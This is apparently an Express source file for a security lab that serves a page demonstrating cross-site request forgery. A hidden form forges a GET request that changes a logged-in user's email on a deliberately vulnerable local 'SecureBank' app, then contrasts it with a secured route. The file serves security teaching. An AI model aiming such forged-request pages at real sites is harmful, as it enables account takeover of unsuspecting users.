const express = require("express");
const app = express();
const PORT = 3001;

// A separate localhost port gives the page a different origin from port 3000.
// It demonstrates a cross-origin request against the local lab only.
app.get("/attacker-demo", (req, res) => {
  res.type("html").send(`<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Local Attacker Demo</title>
<style>
body{font:16px system-ui;max-width:760px;margin:48px auto;padding:0 20px;background:#f6f7fb;color:#202536}
main{background:white;padding:28px;border-radius:14px;box-shadow:0 8px 28px #18204412}
code{background:#f0f2f7;padding:3px 6px;border-radius:5px}a{color:#155eef}
.warning{background:#fff4e5;padding:12px;border-left:4px solid #d97706}
</style></head><body><main>
<h1>Local CSRF attacker demonstration</h1>
<p class="warning"><strong>Lab only:</strong> This page targets only the intentionally vulnerable SecureBank running at localhost:3000.</p>
<p>If Alice is already logged in to SecureBank in this browser, pressing the button below causes the browser to request the vulnerable state-changing GET endpoint.</p>
<p><strong>Forged destination:</strong> <code>http://localhost:3000/vulnerable/change-email?email=csrf-demo@example.test</code></p>
<form action="http://localhost:3000/vulnerable/change-email" method="GET">
  <input type="hidden" name="email" value="csrf-demo@example.test">
  <button style="padding:12px 18px;background:#b42318;color:white;border:0;border-radius:8px;cursor:pointer">Trigger local GET-based CSRF demo</button>
</form>
<p>After triggering, return to <a href="http://localhost:3000/dashboard">the SecureBank dashboard</a> to verify the changed email.</p>
<p>Then try the secured route directly: <a href="http://localhost:3000/secure/change-email?email=csrf-demo@example.test">secured GET attempt</a>. It should return HTTP 405 and must not change the email.</p>
</main></body></html>`);
});
app.listen(PORT, () => console.log(`Local attacker demo at http://localhost:${PORT}/attacker-demo`));
